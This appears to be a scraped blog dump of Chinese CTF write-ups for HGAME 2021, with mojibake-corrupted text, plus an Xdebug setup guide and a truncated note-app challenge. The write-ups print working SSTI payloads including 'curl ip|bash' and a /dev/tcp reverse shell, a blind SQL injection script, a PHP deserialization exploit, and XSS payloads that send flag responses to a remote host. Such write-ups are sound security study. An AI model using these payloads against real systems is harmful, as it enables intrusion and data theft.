æè¿°çš„æ—¶å€™å­˜åœ¨SSTIï¼Œåœ¨æŸ¥çœ‹é¡µé¢å¯ä»¥çœ‹åˆ°SSTIå·²ç»æˆåŠŸäº†ï¼š\næœ€ä¸ºå¸¸è§„çš„payloadï¼š\n{{[].__class__.__mro__[1].__subclasses__()}}\r{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('ls /').read()}}\r{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('curl ip|bash').read()}}\rå› ä¸ºå‘½ä»¤æ‰§è¡Œå¤„æœ‰wafï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©ç›´æ¥å¼¹shellï¼š\nnc -lvnp 8888\rbash -i \u0026gt;\u0026amp; /dev/tcp/ip/8888 0\u0026gt;\u0026amp;1\rå§¿åŠ¿è¿˜æ˜¯æ¯”è¾ƒå¸¸è§„ï¼›\nåˆ†äº«ä¸€ä¸ªä»[].__class__.__mro__[1].__subclasses__()æŸ¥æ‰¾æ¨¡å—ä½ç½®çš„è„šæœ¬ï¼š\n#python 3 import re str = \u0026#39;\u0026#39;\u0026#39; [å›æ˜¾å†…å®¹] \u0026#39;\u0026#39;\u0026#39; list = re.split(\u0026#39;,\u0026#39;, str) for i in range(0, len(list)): if \u0026#39;catch_warnings\u0026#39; in list[i]: print(i) break iki-Jail è€ƒç‚¹ï¼šMySQLæ³¨å…¥ï¼Œå•å¼•å·é€ƒé€¸\nç†Ÿæ‚‰çš„ç™»å½•æ¡†ï¼Œç†Ÿæ‚‰çš„sqlæ³¨å…¥\nå‘ç°ç”¨æˆ·å­—æ®µå¿…é¡»è¦é‚®ç®±æ‰å¯ä»¥ï¼Œè€Œä¸”å¦‚æœå¼€äº†BurpæŠ“åŒ…ä¹‹åä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œå¯¼è‡´Ajaxä¸èƒ½å·¥ä½œã€‚\näºæ˜¯ç›´æ¥ä½¿ç”¨bpå¯¹login.phpå‘åŒ…ï¼›\nè¿›è¡Œäº†ç®€å•çš„fuzzï¼Œè¿‡æ»¤å¦‚ä¸‹ï¼š\nç”±å•åŒå¼•å·è¿‡æ»¤æƒ³åˆ°äº†\\é€ƒé€¸å•å¼•å·ï¼Œå½“æˆ‘ä»¬ç”¨æˆ·åè¾“å…¥admin\\çš„æ—¶å€™ï¼Œè¯­å¥å˜æˆäº†ï¼š\nSELECT * FROM user WHERE username=\u0026#39;admin\\\u0026#39; AND password=\u0026#39;xxx\u0026#39; é‚£ä¹ˆxxxå°±å˜æˆäº†sqlè¯­å¥æ‰§è¡Œï¼Œé€ æˆäº†æ³¨å…¥ï¼›\nç»“æœå‘ç°åªèƒ½å»¶æ—¶æ³¨å…¥ï¼š\nexpï¼š\n#python3,wh1sper import requests import time host = \u0026#39;https://jailbreak.liki.link/login.php\u0026#39; def mid(bot, top): return (int)(0.5*(top+bot)) def transToHex(flag): res = \u0026#39;\u0026#39; for i in flag: res += hex(ord(i)) res = \u0026#39;0x\u0026#39; + res.replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;) return res def sqli(): name = \u0026#39;\u0026#39; for j in range(1, 200): top = 126 bot = 32 while top \u0026gt; bot: babyselect = \u0026#39;(database())\u0026#39;#week3sqli babyselect = \u0026#34;(select group_concat(table_name) from information_schema.TABLES where table_schema like database())\u0026#34;#u5ers babyselect = \u0026#34;(select group_concat(column_name) from information_schema.columns where table_name like 0x7535657273)\u0026#34;#usern@me,p@ssword babyselect = \u0026#34;(select `p@ssword` from week3sqli.u5ers)\u0026#34;#sOme7hiNgseCretw4sHidd3n babyselect = \u0026#34;(select `usern@me` from week3sqli.u5ers)\u0026#34;#admin payload = \u0026#34;^(if((ascii(substr({},{},1))\u0026gt;{}),1,sleep(2)))#\u0026#34;.format(babyselect, j, mid(bot, top)) data = { \u0026#34;username\u0026#34;: \u0026#34;admin\\\\\u0026#34;, \u0026#34;password\u0026#34;: payload.replace(\u0026#39; \u0026#39;, \u0026#39;/**/\u0026#39;) #^(if((ascii(1)\u0026gt;55),sleep(3),sleep(3)))#è¿™ä¸ªç¡®å®å»¶æ—¶æˆåŠŸäº† } try: start = time.time() r = requests.post(url=host, data=data) print(data) print(time.time()-start) if time.time()-start \u0026lt; 1.5: bot = mid(bot, top) + 1 else: top = mid(bot, top) except: continue name += chr(top) print(name) if __name__ == \u0026#39;__main__\u0026#39;: sqli() #hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets} hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}\nArknights è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–\né¢˜ç›®æ˜¯ä¸€ä¸ªç±»ä¼¼äºæŠ½å¡çš„ç½‘ç«™ï¼Œæè¿°é‡Œé¢è¯´\u0026quot;r4uç”¨gitéƒ¨ç½²åˆ°äº†è‡ªå·±çš„æœåŠ¡å™¨ä¸Š\u0026quot;ï¼Œé‚£ä¹ˆè‡ªç„¶è€Œç„¶GithackæŠŠæºç hackä¸‹æ¥ã€‚\nsource.zip\nåœ¨simulator.phpæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šç±»ï¼Œå…¶ä¸­ç¬¬146è¡Œ\nclass Eeeeeeevallllllll{ public $msg=\u0026#34;åålikiåˆ°æ­¤ä¸€æ¸¸\u0026#34;; public function __destruct() { echo $this-\u0026gt;msg; } } æœ‰ä¸€ä¸ªechoæ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å…¨å±€æœç´¢__toStringã€‚ç¬¬93è¡Œï¼š\nclass CardsPool{ â€¦â€¦ public function __toString(){ return file_get_contents($this-\u0026gt;file); } } popé“¾å¾ˆæ˜ç¡®ï¼Œå°±çœ‹å¦‚ä½•è§¦å‘ååºåˆ—åŒ–äº†ã€‚\nç¬¬137è¡ŒSession::extract():\npublic function extract($session){ $sess_array = explode(\u0026#34;.\u0026#34;, $session); $data = base64_decode($sess_array[0]); $sign = base64_decode($sess_array[1]); if($sign === md5($data . self::secret_key)){ $this-\u0026gt;sessiondata = unserialize($data); }else{ unset($this-\u0026gt;sessiondata); die(\u0026#34;go away! you hacker!\u0026#34;); } ä»–ä¼šæŠŠsessionçš„.å‰é¢çš„å†…å®¹ååºåˆ—åŒ–ï¼Œå¹¶ä¸”ä¼šåšä¸€ä¸ªåŠ ç›çš„åˆ¤æ–­ï¼Œä½†æ˜¯å¯†é’¥åœ¨103è¡Œå·²ç»ç»™äº†\nconst SECRET_KEY = \u0026#34;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\u0026#34;; é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªexpï¼š\n\u0026lt;?php class Eeeeeeevallllllll { public $msg = \u0026#39;a\u0026#39;; } class CardsPool { public $cards; private $file = \u0026#39;flag.php\u0026#39;; } $pop = new Eeeeeeevallllllll(); $pop-\u0026gt;msg = new CardsPool(); //echo serialize($pop); $key = \u0026#34;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\u0026#34;; $sign = md5(serialize($pop).$key); $payload = base64_encode(serialize($pop)).\u0026#39;.\u0026#39;.base64_encode($sign); echo $payload; /* $sess_array = explode(\u0026#34;.\u0026#34;, $payload); $data = base64_decode($sess_array[0]); echo $data,\u0026#34;\\n\u0026#34;; $sign = base64_decode($sess_array[1]); echo $sign,\u0026#34;\\n\u0026#34;; if($sign === md5($data . $key)){ unserialize($data); }else{ echo $sign; die(\u0026#34;go away! you hacker!\u0026#34;); } */ å‘é€sessionå³å¯å¾—åˆ°flag\nPost to zuckonit2.0 è€ƒç‚¹ï¼šXSS\nç½‘ç«™æ˜¯ä¸€ä¸ªåˆ›å»ºç¬”è®°çš„ç«™ç‚¹ï¼Œå­˜åœ¨XSSæ¼æ´\nåœ¨/static/www.zipç»™äº†æºç ï¼šsource.zip\nå’Œweek2çš„XSSæ¯”èµ·æ¥å¤šä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥æ›¿æ¢æ‰¹é‡å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”åœ¨/previewæŸ¥çœ‹æ›¿æ¢çš„ç»“æœ\nå®¡è®¡æºç ï¼Œåœ¨æ·»åŠ ç•™è¨€çš„å­˜åœ¨ä¸€ä¸ªwafï¼š\nè·Ÿè¿›å‡½æ•°ï¼š\ndef escape_index(original): content = original content_iframe = re.sub(r\u0026#34;^(\u0026lt;?/?iframe)\\s+.*?(src=[\\\u0026#34;\u0026#39;][a-zA-Z/]{1,8}[\\\u0026#34;\u0026#39;]).*?(\u0026gt;?)$\u0026#34;, r\u0026#34;\\1 \\2 \\3\u0026#34;, content)#åªç•™srcå±æ€§ if content_iframe != content or re.match(r\u0026#34;^(\u0026lt;?/?iframe)\\s+(src=[\\\u0026#34;\u0026#39;][a-zA-Z/]{1,8}[\\\u0026#34;\u0026#39;])$\u0026#34;, content): return content_iframe else: content = re.sub(r\u0026#34;\u0026lt;*/?(.*?)\u0026gt;?\u0026#34;, r\u0026#34;\\1\u0026#34;, content) return content å¯ä»¥çœ‹åˆ°åªå…è®¸æˆ‘ä»¬æ·»åŠ ç±»ä¼¼äº\u0026lt;iframe scr=\u0026quot;xxx\u0026quot;\u0026gt;çš„æ ‡ç­¾ï¼Œå¹¶ä¸”xxxé™åˆ¶åœ¨1-8ä½ï¼Œæ˜¾ç„¶æ²¡åŠæ³•ç›´æ¥æ‰§è¡ŒJSã€‚\nä¸è¿‡æˆ‘ä»¬å¯ä»¥æ·»åŠ \u0026lt;iframe scr=\u0026quot;/preview \u0026quot;\u0026gt;æ¥ä½¿å¾—indexèƒ½ç›´æ¥çœ‹åˆ°/previewé¡µé¢ï¼š\nå†é€šè¿‡å­—ç¬¦ä¸²æ›¿æ¢åŠŸèƒ½ï¼ŒæŠŠxxxæ¢æˆjavascript:xxxxxï¼Œå½¢æˆ\u0026lt;iframe src='javascript:alter(1)'\u0026gt;å³å¯XSS\npayloadï¼š\njavascript:document.write(atob(\u0026#39;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL2Nvb2tpZS5qcyI+PC9zY3JpcHQ+\u0026#39;)); å°æ‰‹ä¸€æŠ–ï¼Œcookieåˆ°æ‰‹ï¼š\nhgame{simple_csp_bypass\u0026amp;a_small_mistake_on_the_replace_function}\nPost to zuckonit another version è€ƒç‚¹ï¼šXSSï¼ŒHttpOnlyç»•è¿‡\nè¯´æ˜¯ç»•HttpOnlyï¼Œå®åˆ™å¹¶æ²¡æœ‰ç»•ï¼›\nç›¸æ¯”äºä¸Šä¸€é“XSSï¼š\n  å¢åŠ äº†HttpOnlyï¼Œä½¿å¾—æˆ‘ä»¬ç›´æ¥ç”¨jsä¸èƒ½ç›´æ¥è·å–åˆ°æœ¬åœ°cookieï¼›\n  ä¿®æ”¹äº†åŠŸèƒ½ï¼ŒæŠŠç›´æ¥æ›¿æ¢å­—ç¬¦ä¸²æ¢æˆäº†æŸ¥æ‰¾å­—ç¬¦ä¸²\n  ä¾ç„¶åœ¨static/www.zipç»™å‡ºäº†æºç ï¼šsource.zip\næºç å¤§åŒå°å¼‚ï¼Œç”šè‡³è¿waféƒ½æ²¡å˜ï¼Œå•ç‹¬åœ¨å­—ç¬¦ä¸²æ›¿æ¢åŠŸèƒ½ä¸Šä¿®æ”¹ä¸ºæ­£åˆ™åŒ¹é…å¹¶ä¸”åœ¨ä¸¤ç«¯åŠ \u0026lt;b\u0026gt;æ ‡ç­¾ï¼Œå¾—åˆ°é«˜äº®æ•ˆæœ\nå¦‚æœæŒ‰ç…§æ­£å¸¸æ€ç»´æ¥æŸ¥æ‰¾\u0026rsquo;a\u0026rsquo;å­—ç¬¦ä¸²çš„è¯ï¼Œæ•ˆæœå°±å¦‚ä¸‹å›¾ï¼š\nä½†æ˜¯æˆ‘ä»¬åº”å½“æ³¨æ„åˆ°ï¼Œè¿™ä¸ªé«˜äº®å®é™…ä¸Šè¿˜æ˜¯ç”±String.prototype.replace()æ–¹æ³•æ¥è¿›è¡Œæ­£åˆ™æ›¿æ¢çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœè¾“å…¥.*ä¹‹ç±»çš„å…³é”®è¯è¿›è¡Œé«˜äº®å°±ä¼šå‡ºç°æ„æƒ³ä¸åˆ°çš„æ•ˆæœï¼š æ²¡é”™ï¼Œå› ä¸ºæ­£åˆ™æ›¿æ¢è®©æˆ‘ä»¬å¾—ä»¥æœ‰æœºå¯ä¹˜\næ€è·¯è¿˜æ˜¯ä¸€æ ·ï¼Œå…ˆåˆ©ç”¨æ›¿æ¢æ„é€ å¥½XSSï¼Œå†åˆ©ç”¨\u0026lt;iframe src='/preview'\u0026gt;æ¥è§¦å‘0-click\npayloadï¼š\n\u0026lt;iframe src='/preview'\u0026gt;\r\u0026lt;iframe src='AAA' \u0026gt;\ræ›¿æ¢çš„payloadï¼š\nAAA('srcdoc='\u0026amp;lt;img src=1 onerror=document.write(atob(\u0026amp;#x27;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg==\u0026amp;#x27;));\u0026amp;gt;')*\ræ›¿æ¢ä¹‹åå…¶å®æ˜¯è¿™æ ·ï¼š\nå®é™…ä¸Šæ˜¯åˆ©ç”¨äº†iframeæ ‡ç­¾çš„srcdocå±æ€§å’ŒHTMLå®ä½“ç¼–ç æ¥ç»•è¿‡\n\u0026lt;iframe src=\u0026quot;\u0026lt;b class=\u0026amp;quot;search_result\u0026amp;quot;\u0026gt;AAA(\u0026quot; srcdoc=\u0026quot;\u0026lt;img src=1 onerror=document.write(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg=='));\u0026gt;\u0026quot; )*\u0026lt;=\u0026quot;\u0026quot; b=\u0026quot;\u0026quot;\u0026gt;' \u0026gt;\u0026lt;/iframe\u0026gt;\rç»“æœä¸€ç›®äº†ç„¶ï¼›\nè€Œiframeé‡Œé¢\u0026lt;script\u0026gt;æŒ‡å‘çš„JSï¼š\nxmlhttp = new XMLHttpRequest(); //æ˜¯å¦èƒ½è·¨åŸŸ xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState == 4) { location.href = \u0026#39;http://ip/?cookie=\u0026#39; + btoa(xmlhttp.responseText) //å¾—ç”¨btoa()è¿›è¡Œbase64ç¼–ç ï¼Œä¸ç„¶flagä¼šå¾ˆç¥å¿…  //å°è¯•getAllResponseHeaders()ä¸è¡Œï¼Œå› ä¸ºHttpOnlyçš„Set-Cookieå¤´ä¸é€‚ç”¨  } }; //è®¾ç½®è¿æ¥ä¿¡æ¯ //ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºhttpçš„è¯·æ±‚æ–¹å¼ï¼Œæ”¯æŒæ‰€æœ‰httpçš„è¯·æ±‚æ–¹å¼ï¼Œä¸»è¦ä½¿ç”¨getå’Œpost //ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºè¯·æ±‚çš„urlåœ°å€ï¼Œgetæ–¹å¼è¯·æ±‚çš„å‚æ•°ä¹Ÿåœ¨urlä¸­ //ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºé‡‡ç”¨å¼‚æ­¥è¿˜æ˜¯åŒæ­¥æ–¹å¼äº¤äº’ï¼Œtrueè¡¨ç¤ºå¼‚æ­¥ xmlhttp.open(\u0026#39;GET\u0026#39;, \u0026#39;/flag\u0026#39;, true); //4.å‘é€æ•°æ®ï¼Œå¼€å§‹å’ŒæœåŠ¡å™¨ç«¯è¿›è¡Œäº¤äº’ //åŒæ­¥æ–¹å¼ä¸‹ï¼Œsendè¿™å¥è¯ä¼šåœ¨æœåŠ¡å™¨æ®µæ•°æ®å›æ¥åæ‰æ‰§è¡Œå®Œ //å¼‚æ­¥æ–¹å¼ä¸‹ï¼Œsendè¿™å¥è¯ä¼šç«‹å³å®Œæˆæ‰§è¡Œ xmlhttp.send(\u0026#39;\u0026#39;); ä¸èƒ½ç»•HttpOnlyæ¥è·å–cookieï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥è®©adminè¯·æ±‚/flagï¼ŒæŠŠresponseTextå‘ç»™æˆ‘ä»¬å°±è¡Œäº†ï¼›\nè¿™ä¸ªæ˜¯æœ¬åœ°æ‰“çš„ç»“æœï¼š\nå¤§æ‰‹ä¸€æŠ–ï¼Œflagåˆ°æ‰‹ï¼š\nå› ä¸ºflagé‡Œé¢å‡ºé¢˜äººæ•…æ„æ”¾äº†\u0026amp;å­—ç¬¦è®©æˆ‘ä»¬è¸©å‘ï¼Œæ‰“å‡ºæ¥çš„responseTextéœ€è¦base64ç¼–ç ã€‚\nä¸‹é¢è¿™ä¸ªæ‰å¯¹ã€‚\n","date":"2021-02-20T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png","permalink":"https://anthem-whisper.github.io/p/hgame-2021-writeup/","title":"HGAME 2021 Writeup"},{"content":"Debianä¸‹PHP Xdebugè°ƒè¯•ç¯å¢ƒæ­å»º  æœ¬æ–‡æ°¸ä¹…é“¾æ¥ï¼šhttp://wh1sper.com/debian%e4%b8%8bphp-xdebug%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/\n å‰è¨€ Xdebugæ˜¯PHPçš„æ‰©å±•ï¼Œç”¨äºååŠ©è°ƒè¯•å’Œå¼€å‘ã€‚\n å®ƒåŒ…å«ä¸€ä¸ªç”¨äºIDEçš„è°ƒè¯•å™¨ å®ƒå‡çº§äº†PHPçš„var_dump()å‡½æ•° å®ƒä¸ºé€šçŸ¥ï¼Œè­¦å‘Šï¼Œé”™è¯¯å’Œå¼‚å¸¸æ·»åŠ äº†å †æ ˆè·Ÿè¸ª å®ƒå…·æœ‰è®°å½•æ¯ä¸ªå‡½æ•°è°ƒç”¨å’Œç£ç›˜å˜é‡èµ‹å€¼çš„åŠŸèƒ½ å®ƒåŒ…å«ä¸€ä¸ªåˆ†æå™¨ å®ƒæä¾›äº†ä¸PHPUnitä¸€èµ·ä½¿ç”¨çš„ä»£ç è¦†ç›–åŠŸèƒ½ã€‚  æœ¬åœ°è·Ÿä»£ç å¿…å¤‡çš„å·¥å…·ã€‚ ä½†ä¸æ¨èåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨xdebugï¼Œå› ä¸ºä»–å¤ªé‡äº†ã€‚\né¢„ç½®ç¯å¢ƒ   OS: Kali GNU/Linux Rolling x86_64\n  Kernel: 5.7.0-kali1-amd64\n  PHP version: 7.4.14\n  Server API: FPM/FastCGI\n  nginx version: nginx/1.18.0\n  PhpStorm version: 2020.3\n  ä¸‹è½½å®‰è£…Xdebug è®¿é—®https://xdebug.org/wizard\nåœ¨webæœåŠ¡å™¨ä¸­æ”¾å…¥phpinfoï¼Œï¼ˆæ³¨æ„æœ€å¥½æ˜¯ä½¿ç”¨webæœåŠ¡ï¼Œå¦‚æœæ˜¯æœ¬åœ°phpè„šæœ¬çš„è¯php.iniå¯èƒ½ä¼šä¸ä¸€æ ·ï¼‰\nè®¿é—®ä¹‹åå°†æ•´ä¸ªé¡µé¢æºç Ctrl+A Ctrl+Cå¤åˆ¶åˆ°æ¡†é‡Œé¢ï¼š åˆ†æä¹‹åä¼šè‡ªåŠ¨ç»™ä½ æœ€åˆé€‚çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”å‘Šè¯‰ä½ åç»­å®‰è£…æ­¥éª¤ã€‚\nä¸‹è½½ç»™å‡ºçš„.tar.tgzæ–‡ä»¶\n1.å®‰è£…PHPæ‹“å±•\napt-get install php-dev autoconf automake\r2.è§£å‹\ntar -xvzf xdebug-3.0.2.tgz\rcd xdebug-3.0.2\r3.æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¦‚æœæŠ¥é”™Command not foundï¼Œé‚£å°±å…ˆæ‰§è¡Œ1.\nphpize\rå®Œæˆä¹‹åä¼šè¾“å‡ºç±»ä¼¼äºä»¥ä¸‹å†…å®¹ï¼Œå› ç¯å¢ƒè€Œå¼‚ï¼Œå…·ä½“è¿˜è¯·å‚è€ƒhttps://xdebug.org/wizard\nConfiguring for:\r...\rZend Module Api No: 20190902\rZend Extension Api No: 320190902\réšååˆ†åˆ«éœ€è¦æ‰§è¡Œ./configureå’Œmakeä»¥åŠcpç­‰å‘½ä»¤ï¼Œå› ç¯å¢ƒè€Œå¼‚ï¼Œå…·ä½“å‚è€ƒhttps://xdebug.org/wizardï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚\né…ç½®Xdebug æ‰“å¼€php.ini\nåœ¨æœ«å°¾å†™å…¥ï¼ˆæœ€å¥½å»æ‰æ³¨é‡Šï¼‰ï¼š\n[xdebug]\r#pay attention,xdebug3 is different from 2\rzend_extension = /usr/lib/php/20190902/xdebug.so#è¿™é‡Œä½ç½®å› ç¯å¢ƒè€Œå¼‚\rxdebug.mode=debug\rxdebug.remote_handler = dbgp\rxdebug.client_host = 127.0.0.1 #å®‰è£…æœ‰PhpStormçš„æœºå™¨\rxdebug.client_port = 9001 #ç«¯å£å¯ä¿®æ”¹ï¼Œé˜²æ­¢å†²çª\rxdebug.remote_mode=req #å¯ä»¥è®¾ä¸ºreqæˆ–jitï¼Œreqè¡¨ç¤ºè„šæœ¬ä¸€å¼€å§‹è¿è¡Œå°±è¿æ¥è¿œç¨‹å®¢æˆ·ç«¯ï¼Œjitè¡¨ç¤ºè„šæœ¬å‡ºé”™æ—¶æ‰è¿æ¥è¿œç¨‹å®¢æˆ·ç«¯ã€‚\rxdebug.idekey = PHPSTROM\r**æ³¨æ„ï¼š**å¦‚æœä½ æƒ³ Xdebug å’Œ OPCache ä¸€èµ·ä½¿ç”¨ï¼Œå¿…é¡»åœ¨ OPCache ä¹‹ååŠ è½½ Xdebug zend_extension ä»£ç è¡Œã€‚\nå› ä¸ºæˆ‘ä¸‹è½½çš„ç‰ˆæœ¬æ˜¯Xdebug3ï¼Œç›¸å¯¹äºXdebug2ï¼Œremote_enableè¢«modeå–ä»£ï¼Œremote_hostè¢«client_hostå–ä»£ï¼Œremote_portæ”¹ä¸ºclient_portï¼Œé»˜è®¤ä¸º9003ç«¯å£ï¼Œclient_hosté»˜è®¤ä¸ºlocalhostã€‚\nå¦‚æœä½ ä¸‹è½½çš„æ˜¯Xdebug2ï¼š\n[xdebug]\rzend_extension= /usr/lib/php/20190902/xdebug.so\rxdebug.remote_enable = on\rxdebug.remote_port = 9001\rxdebug.remote_host = 127.0.0.1\rå†™å…¥å®Œæ¯•åï¼Œé‡å¯php-fpmæˆ–è€…é‡å¯apacheã€‚\nä¹‹åå†æ¬¡è®¿é—®phpinfoï¼ŒæŒ‰Ctrl+Fæœç´¢Xdebugï¼ŒæˆåŠŸçš„è¯ä½ ä¼šçœ‹åˆ°å’Œä¸‹é¢å·®ä¸å¤šçš„æƒ…å†µ\né…ç½®PhpStorm æ‰“å¼€PhpStormï¼›\nåœ¨File-\u0026gt;Languages \u0026amp; Frameworks-\u0026gt;PHPä¸‹ï¼Œé€‰æ‹©CLI interpreterä¸ºä½ åˆšæ‰é…ç½®çš„PHPç‰ˆæœ¬\næˆåŠŸçš„è¯ä¼šå‡ºç°Xdebugçš„å­—æ ·\næ²¡æœ‰çš„è¯é‡æ–°æ‰“å¼€php.inié…ç½®\né€‰æ‹©Debugåˆ†æ”¯ï¼Œä¿è¯portå’Œphp.iniä¸­çš„ä¸€è‡´\né…ç½®DBGp Proxyï¼Œä¸€æ ·ã€‚\né…ç½®Server\nç‚¹å‡»å³ä¸Šè§’ï¼Œç¼–è¾‘é…ç½®\nåœ¨Serverä¸‹æ‹‰æ¡†ä¸­ï¼Œé€‰æ‹©æˆ‘ä»¬åœ¨ç¬¬4æ­¥è®¾ç½®çš„ServeræœåŠ¡åç§°ï¼ˆä¹‹å‰é…ç½®çš„Serverï¼‰ï¼ŒBrowseré€‰æ‹©ä½ è¦ä½¿ç”¨çš„æµè§ˆå™¨\nALL Right;\né…ç½®FireFox è¿™ä¸€æ­¥å¯ä»¥ä¸éœ€è¦ï¼Œä¸è¿‡é…ç½®ä¹‹åæ–¹ä¾¿ä¸€ç‚¹ï¼›\nFireFoxè®¿é—®https://addons.mozilla.org/en-US/firefox/addon/xdebug-helper-for-firefox/ï¼Œå®‰è£…æ’ä»¶ã€‚\nå®‰è£…å®Œæˆä¹‹åï¼Œå¼€å¯æ’ä»¶ï¼Œç»™ç¨‹åºä¸‹ä¸ªæ–­ç‚¹ï¼Œè®¿é—®ï¼Œå¦‚æœæˆåŠŸPhpStormä¼šè‡ªåŠ¨è·³å‡ºæ¥ï¼š\nå¥½äº†ï¼Œåˆ°è¿™é‡Œæˆ‘ä»¬å°±é…ç½®å®Œæˆäº†ã€‚\néšåæºå¸¦Cookie: XDEBUG_SESSION=\u0026quot;ECLIPSE\u0026quot;å¤´è®¿é—®ï¼ˆæˆ–è€…å¼€FireFoxæ’ä»¶ï¼Œä¸€ä¸ªé“ç†ï¼‰å°±å¯ä»¥è¿›å…¥debugäº†\nå¦å¤–åœ¨nginx.confé‡Œé¢è®¾ç½®fastcgi_read_timeout 600å¯ä»¥è°ƒæ•´fastcgiè¿›ç¨‹å‘ nginx è¿›ç¨‹å‘é€è¾“å‡ºè¿‡ç¨‹çš„è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤å€¼60ç§’ï¼Œè®©è°ƒè¯•å¾—åˆ°æ—¶é—´\n","date":"2021-02-19T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"Debianä¸‹PHP Xdebugè°ƒè¯•ç¯å¢ƒæ­å»º"},{"content":"oh-my-note è€ƒç‚¹ï¼šæ—¶é—´æˆ³çˆ†ç ´\né¢˜ç›®åˆ†æ å…ˆç»™äº†æºç ï¼šsource.zip\né¢˜ç›®æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œå‘å¸ƒç•™è¨€çš„æ—¶å€™è¾“å…¥ç”¨æˆ·åå¯ä»¥é€‰æ‹©ä¸ºå…¬å¼€æˆ–è€…ç§æœ‰\nä»£ç å®¡è®¡ æ‰“å¼€æºç ï¼Œå®¡è®¡ï¼›\nåœ¨create_note()å‡½æ•°ä¸­ï¼Œå¦‚æœç”¨æˆ·ä¸å­˜åœ¨ï¼Œå°±ä¼šè‡ªåŠ¨åˆ›å»º\n@app.route(\u0026#39;/create_note\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def create_note(): try: form = CreateNoteForm() if request.method == \u0026#34;POST\u0026#34;: username = form.username.data title = form.title.data text = form.body.data prv = str(form.private.data) user = User.query.filter_by(username=username).first() if user: user_id = user.user_id else: timestamp = round(time.time(), 4) random.seed(timestamp) user_id = get_random_id() user = User(username=username, user_id=user_id) db.session.add(user) db.session.commit() session[\u0026#39;username\u0026#39;] = username timestamp = round(time.time(), 4) post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(\u0026#39;%Y-%m-%d%H:%M UTC\u0026#39;) #è·å–å°æ•°ç‚¹åå››ä½UNIXæ—¶é—´æˆ³å¯¹åº”çš„Y-M-d H-Mæ—¶é—´ random.seed(user_id + post_at) note_id = get_random_id() note = Note(user_id=user_id, note_id=note_id, title=title, text=text, prv=prv, post_at=post_at) db.session.add(note) db.session.commit() return redirect(url_for(\u0026#39;index\u0026#39;)) else: return render_template(\u0026#34;create.html\u0026#34;, form=form) except Exception as e: pass å…¶ä¸­ï¼Œæˆ‘ä»¬post_atå·²ç»çŸ¥é“\né‚£ä¹ˆåœ¨ä¸‹é¢è¿™å¼ å›¾é‡Œï¼Œæˆ‘ä»¬åªæœ‰user_idä¸çŸ¥é“\nè€Œmy_note()çš„elseé‡Œé¢åªéœ€è¦user_idå°±å¯ä»¥åˆ—å‡ºæ‰€æœ‰ç§æœ‰note\n@app.route(\u0026#39;/my_notes\u0026#39;) def my_notes(): if session.get(\u0026#39;username\u0026#39;): username = session[\u0026#39;username\u0026#39;] user_id = User.query.filter_by(username=username).first().user_id else: user_id = request.args.get(\u0026#39;user_id\u0026#39;) if not user_id: return redirect(url_for(\u0026#39;index\u0026#39;)) results = Note.query.filter_by(user_id=user_id).limit(100).all() notes = [] for x in results: note = {} note[\u0026#39;title\u0026#39;] = x.title note[\u0026#39;note_id\u0026#39;] = x.note_id notes.append(note) return render_template(\u0026#34;my_notes.html\u0026#34;, notes=notes) äºæ˜¯æˆ‘ä»¬å¯ä»¥æ ¹æ®å·²çŸ¥çš„note_idå’Œpost_atæ¥åæ¨çˆ†ç ´user_idï¼Œåªè¦ç®—å‡ºadminçš„idå³å¯çœ‹åˆ°å‘å¸ƒçš„ç§æœ‰flagã€‚\nå› ä¸ºæ—¶é—´æˆ³ç²¾ç¡®åˆ°äº†å°æ•°ç‚¹åå››ä½ï¼Œæˆ‘ä»¬çŸ¥é“çš„post_atæ˜¯åˆ†é’Ÿçº§åˆ«çš„ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦çˆ†ç ´æœ€å¤š10000*60æ¬¡\nimport random import datetime import time import string def get_random_id(): alphabet = list(string.ascii_lowercase + string.digits) return \u0026#39;\u0026#39;.join([random.choice(alphabet) for _ in range(32)]) post_at = \u0026#39;2021-01-15 02:29 